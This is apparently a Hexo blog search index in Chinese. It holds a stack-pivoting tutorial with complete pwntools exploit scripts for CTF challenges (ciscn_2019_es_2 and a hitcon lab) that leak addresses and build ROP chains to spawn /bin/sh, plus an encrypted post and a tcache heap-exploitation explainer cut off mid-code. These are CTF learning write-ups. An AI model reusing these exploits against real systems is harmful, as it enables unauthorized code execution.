<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>栈迁移</title>
    <url>/2025/03/21/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>本文讨论的原理，都是针对于32位程序的栈迁移来说的，例题里面有一道是64位的栈迁移</p>
<h3 id="1、什么是栈迁移"><a href="#1、什么是栈迁移" class="headerlink" title="1、什么是栈迁移"></a>1、什么是栈迁移</h3><p> 这里我谈谈自己的理解，简单一句话：<strong>栈迁移就是控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面），此时新的问题随之产生，为什么要换个地方GetShell，这就是下一段要说的为什么要使用栈迁移。</p>
<h3 id="2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）"><a href="#2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）" class="headerlink" title="2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）"></a>2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</h3><p>言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p>
<p> 使用栈迁移的条件：</p>
<ul>
<li>要能够溢出</li>
<li>有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</li>
<li>可以控制sp寄存器</li>
</ul>
<h3 id="3、学习栈迁移需要自身掌握什么知识"><a href="#3、学习栈迁移需要自身掌握什么知识" class="headerlink" title="3、学习栈迁移需要自身掌握什么知识"></a>3、学习栈迁移需要自身掌握什么知识</h3><ul>
<li>需要掌握汇编基础</li>
<li>较为熟悉栈结构</li>
<li>熟悉函数调用与结束时栈的变化。</li>
</ul>
<p>如果掌握了这些知识，那么理解下面的内容就不会太费力气了。当然如果你会用gdb进行调试的话，通过自己的动手调试，你将理解的更为透彻。如果你和我当初一样，也是对栈迁移一无所知，那么希望你可以仔细阅读下面的内容，我会帮你彻底理解它。</p>
<h3 id="4、栈迁移的原理"><a href="#4、栈迁移的原理" class="headerlink" title="4、栈迁移的原理"></a>4、栈迁移的原理</h3><h5 id="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例"><a href="#ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例" class="headerlink" title="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例"></a>ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0e:0038│ ebp 0xffffd0c8 —▸ 0xffffd0d8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br></pre></td></tr></table></figure>



<p> ebp是0xffffd0c8，它的内容是0xffffd0d8，而这个内容也是一个地址，这个地址里面装的又是0xf7ffd020。ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）。我这里想强调的是<em><strong>ebp和ebp的内容这两者一定不能混为一谈</strong></em>，在阅读下面的内容是，一定要注意区分两者。</p>
<h3 id="栈迁移的核心，就在于两次的leave-ret指令上面"><a href="#栈迁移的核心，就在于两次的leave-ret指令上面" class="headerlink" title="栈迁移的核心，就在于两次的leave;ret指令上面"></a><strong>栈迁移的核心，就在于两次的leave;ret指令上面</strong></h3><p> leave指令即为mov esp ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将<strong>栈顶的内容</strong>弹入ebp（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。具体实现请见下图：</p>
<img data-src="../images/image-20241120213824271.png" alt="image-20241120213824271" style="zoom:50%;" />

<p> ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip（就是下一条指令执行的地址）具体实现请见下图：</p>
<p><img data-src="/../images/2706180-20220118102755803-79970067.png" alt="2706180-20220118102755803-79970067"></p>
<p>若这个ret_address为<code>leave;ret</code>且<code>fake_frame</code>为我们精心构造的栈帧，就可以实现将esp寄存器也迁移到我们精心构造的栈帧，从而实现get_shell等操作，具体实现请见下图：</p>
<p><img data-src="/../images/image-20241120220941300.png" alt="image-20241120220941300"></p>
<p>栈迁移的例题有以下几种：</p>
<p>攻防世界上的greeting-150</p>
<p>BUUCTF上的[Black Watch 入群题]</p>
<p>BUUCTF上的ciscn_2019_es_2</p>
<p>BUUCTF上的gyctf_2020_borrowstack</p>
<p> 它们考察了在迁移到栈，迁移到bss段，从main函数结束时迁移，从main函数调用的函数结束时迁移，和64位的栈迁移以及ret2csu。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>拖入ida中反编译如下，32位只有NX保护：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>大概思路就是，我们要用第一个read来泄露下ebp的地址**（因为是printf来打印字符串，参数是%s，因此是遇见00才停止打印，只要我们第一次read正好输入0x28个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了）**，然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方），</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">                   <span class="comment">#bin_sh的指针         #填充够0x28 |  ebp    |    ret              </span></span><br><span class="line">|system@plt|p32(<span class="number">0</span>)|p32(buf+<span class="number">12</span>)|/<span class="built_in">bin</span>/sh\x00|\x00...|p32(buf-<span class="number">4</span>)|p32(leave_ret)</span><br></pre></td></tr></table></figure>

<p>参数分布参考上图</p>
<p>后面的p32(buf-4) + p32(leave) p32(buf-4) 是将ebp覆盖成buf的地址-4 为什么要-4？这是因为我们利用的是两个leave，但是第二个 leave的pop ebp，在出栈的时候会esp+4。就会指向esp+4的位置， p32(leave) ,将返回地址覆盖成leave 到这里，我们成功将栈劫持到了我们的buf处，接下来就会执行栈里的内容 完整exp见解题过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28649</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">2</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">b&#x27;aabb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&quot;ebp&quot;</span>,ebp)</span><br><span class="line">sh = ebp-<span class="number">0x38</span>+<span class="number">16</span></span><br><span class="line">rop = flat([<span class="number">0</span>,elf.plt[<span class="string">&#x27;system&#x27;</span>],<span class="number">0</span>,sh,<span class="string">b&#x27;/bin&#x27;</span>,<span class="string">b&#x27;/sh\x00&#x27;</span>])</span><br><span class="line">payload = rop.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(ebp-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="hitcon-lab"><a href="#hitcon-lab" class="headerlink" title="hitcon lab"></a>hitcon lab</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;192.168.6.128&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x804ae00</span></span><br><span class="line">buf2 = buf+<span class="number">0x200</span></span><br><span class="line"><span class="comment">#这两个buf是data段靠后的那一块任取的	</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">rop = flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">0x100</span>])</span><br><span class="line">payload += rop</span><br><span class="line">s(payload)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">pop1ret = <span class="number">0x0804836d</span></span><br><span class="line">rop2 = flat([buf2,elf.plt[<span class="string">&#x27;puts&#x27;</span>],pop1ret,elf.got[<span class="string">&#x27;puts&#x27;</span>],read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">0x100</span>])</span><br><span class="line">sl(rop2)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">puts = u32(p.recvline().strip())</span><br><span class="line">lg(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base = puts - <span class="number">0x732a0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system = libc_base + <span class="number">0x48170</span></span><br><span class="line">sh = buf2 + <span class="number">16</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">rop3 = flat([buf,system,<span class="number">0</span>,sh,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>])</span><br><span class="line">sl(rop3)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/03/21/hello-world/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="565033cfbad0e25dd85edd49a3af67852a1a453d8356448553781d12c92411de">4630436162ade97ba2718b7d0c4b3b63f97fe7f487088031e1ec7f30c37889e17af4f6297068ec459b8609dd5e773f884c55009995b4e2fa14cd0ad5eff0ada9f9fb8fb348a39322f64a27b4e67198e9d0918355853825b4a8b859e1b0997d0838db13d93eb663a75abf26151a4cd6693bc3399e41eef6d4a0d8ac518bee9c9ddee4d733ecfde4f1c7c01610b2139c3f919d321e3580e4ea4d25333a1eb6a757138158c91746eb650d2bd292b639e6c34cbf144f87d98390fac9f8662146f06c3a6438c2b9ee94e1d311e783b3870047c72629be8369de61aafcfd95d1a6b146908a00176e823191858046b0d3068b0efa543f002c4411ac17d84cfbc5419db7d33e0dec60d5febc26877845ea4a0c78edbec57ec484cb94f4a5981b779247299a083552613550cf2067f03e18806e1d8b7363322598e505c747f93d1e38576db45e8de5d1770b452a4fb1219a730e7968e9f6fbb48dd64088b4f6b768d41ae0fde1188c840a5b26f4bcf87fc459371861bccf009fd56466bfb6189998e9e6a70ba3621ca8bdf949e5cadcc118f51f12983682d54b3fadc89599f99b3bc97b0ac705b13416a1e530d1e06e17469a74ffce4af1c9c1c3a7fe2e7d43f0a4553f309b55a680d4ba0eff5e1480ff40e6cca6cf09c8d0ab9d3d27139e5f1fa8ce760b2b398ec79fa2325ce353708b5fd4928897ec368d0027fa2da6b5a0fd8e4e9b7529ca09bebcdd4ee3a67b8793bf535765eccd25777435299c4f7eaac3b37aa14cd4e771f0d59050e41a2121cab03ed0afccb01338cfaa270444513ab17731861d2e4818cce309b9ff34abf619216411da184092968ba15dba46fd74305d671fcc251530f5b9827fa2b99f113bdb279c693dd1704ca3a9977b3cf3a9ef9e6e9aea7a55f4fc6fc7431430f1e9e124491e51c5a917d50a11cab0f41057afdd9d73a5b69b54cc67bafaa65d40dd533efc909c87f1c18ae04764a239ce69c0e6b19cc5ed2e7a78ac3ef08cb10b1f5b175a7d09c35fb03134919f9a86758fdb28838be1fac5331cdfa5707833518ca071974ca46fbdbf334145555a36a006404440d8fca60195baebf5d921d9ae64c6ede24c1ac47d7b3df82c3ce65f2f997606186ef07a3f88a8a3c72c8e7356c6e5c164a313008c552320c7cc95166d8e5e707dd2c9dbffb129a9ff70ff8101f09fb70b81f2e64efb235bd7a1a44978559875515a83368f1936fdc556832492ae0671d7b67a6d1103441d906adf08a33a54f41e0e0a81c7b4eac704aaa6c35e18d6dc5e7c207f526d5892197d5ec7c4dc0edc9efb23891b524cebecd0ce984f13642004ae7f4f54a08732b3ecd632161bc17cb1fd597809352045d72809c36c4bbd110a7497cabcf294feeb4d11fa9232188bee2584a68dfd88207a7cd9a48503570676e50847d192a2a6e7a3e53b1288974ea16d0d80073c728e0d84755ce47c943e600c17df7a43d591f7b8468bbefe1285a930632e3cc5655a628782afed132fd2656813b3e22325b3a48436551b12b4bb838771f30eb825dcd8fc754fd10a17f9662286af92f4f8894097e941fe3dbb4831cdbc6b443b1824d50b470da2542da6d87fa03706ed8a14dae9ea9870c7981bf761c813f8db6283e5e4d6f83a5a745ead7855a07cee619cc695b70f3df8b4b82f85ae49a93e0a2e86cb14d6e0f39d7f7bf03c28c6ca9e5390facd1c25ec8a080b42009a9e8e7a2661422d70a39b106406ace53b39d9f03ff1dc17e689135109c611b983c2627adbe1cf664ccb70961af510424ea592895cada1f8c387464a798fa7bccbf6c1194aee98de463a3b9d2dd218e14e3ae7e5d0c5f245cc7346d6e77b8485834290c726ad9b51e466d596aa6f3eda026257f794e43169d555593a6a2edff432c8fee45925e7e160535894a5c8cd682d47da0d6c0d453b6aabb3506802282bee599e6b9b05b39711c44af4661449bc4a5f0a6210b62bf1d925fa4ddd6119bf701a01d5697aca71cada1e1589a0292809eefc99ecf7cdfb7fdf6c58755e4056d96a320cf900212ea371469d77092e46fc449dfa62c7e239cba7cc11a68b343416c661aacab9576053516ad64f6d814c2ccc5e0f884262177421fc187ad171106677e25362053b1dfaf3886dc8836429ab3c84fd6e513de9ae09c0fa33f26d020910e61cf24436a5449543f2cd87c83075d5b6196c0906d9803c75158f3f735c9d5e676bff754f1624524fb3bb6ff74c7bc4efa5232f511f6b0101311503ca3f1f1e2d8896d2bba030c5ce2bfbe55caa42dc943bd894d3b4cb477545f75789e0319ffe57729a98b855a9714508a955c8320a1f26393e1f113062535a766a0467a50c0c9d56bc170e68453c016a231eb5723e8470065d0671efc61360e68506bf08024106b9f7ab456d894dfaf5b0a9b20c29411fbb86373522ac2d8c249cbb43844704009da10719c877b42ea5b0f29a1c857a6010f87cf67a5b6c17e7a692e14343826fdfcba7224f82ad67ab76ee82d6e6c764b155358cfcf2b474558e5368b62028c52c55ea61eff706ae8509a86649d409e3a033fffe63429d8f088985c99c2c574c6c8a8ee48f56d84a1bfbbc48250191029b02c8391e05a23f339dd8727457b77b17b9762d6a4f22a369776bfd3f185a9edcdab5b76017d1488457094eed536638b8565385fcab698c2e89b3ebcf1c5aafd80a54f225949b54174b691c1039aa90305bc2538c92411df088b15d3429a841fbe37b3372015181f4a30a3c1bc6e85539c4bd5a692da38b9e05aa69a2640ca4191cf46eb460bc72f5e6a03d98c5e5703e1971e237f10feca4fd1d6720a6631929b4150e2a1f24df54dfc3b94d0321be2001ddf5b8a7bc71b76e677157fe63fdf0e273af4dca56b9e3aba86fd2f893d1dc0c3ac64663868c19d50e6213033a6b4fac6dfbed7e3a01223421aa246a83db479a938f691c533a975b92477ed639b3aa7ace2b93f6402c6d8fc63504e5f383e07929e10a7839d1a9d17330a2883e68592eaba9a66f7ecf4d7c9778380a9acd2dbbaac5f6ded1f384077269489201d58495f66e6c2e14d6939fd0b56382986631a1b9eaefadce7cf27a8999bb34f675b5806d3c4ee96604468043783c027fa96f06ef3ec165fde40bd102c8</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Tcache attack</title>
    <url>/2025/03/26/tcache_attack/</url>
    <content><![CDATA[<p>文章是在初次学习tcache_attack时写的，有不准确的地方还望指正</p>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><p>cache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技），目的是提升堆管理的性能。但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式。</p>
<blockquote>
<p>主要参考了 glibc 2.27源码，</p>
</blockquote>
<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><p>tcache 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code>。</p>
<p>这其实和 fastbin 很像，但又不一样。</p>
<h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p>
<p>需要注意的是这里的 next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</p>
<p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p>
<h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p>
<ul>
<li><code>tcache_entry</code> 用<strong>单向链表</strong>的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li>
<li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，<strong>每条链上最多可以有 7 个 chunk</strong>。</li>
</ul>
<p>用图表示大概是：</p>
<p><img data-src="/../images/006AWYXBly1fw87zlnrhtj30nh0ciglz.jpg" alt="img"></p>
<h3 id="基本工作方式"><a href="#基本工作方式" class="headerlink" title="基本工作方式"></a>基本工作方式</h3><ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li>
<li>free 内存，且 size 小于 small bin size 时</li>
<li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 后：<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（<strong>默认是 7 个</strong>）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（<strong>不取消 inuse bit</strong>）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空</li>
<li>tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk**，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中**，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
<li>tcache最多由64个bins链接而成，而每一个bins中最多放7个chunk</li>
<li>64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次</li>
<li>这也就意味着我们最大的chunk必须小于0x410,也就是我们申请的size要小于0x408(64位机上)</li>
</ol>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>接下来从2.27源码的角度分析一下 tcache。</p>
<h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><p>第一次 malloc 时，会进入到 <code>MAYBE_INIT_TCACHE ()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span></span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化 tcache</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="comment">// 根据 size 得到的 idx 在合法的范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// tcache-&gt;entries[tc_idx] 有 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span 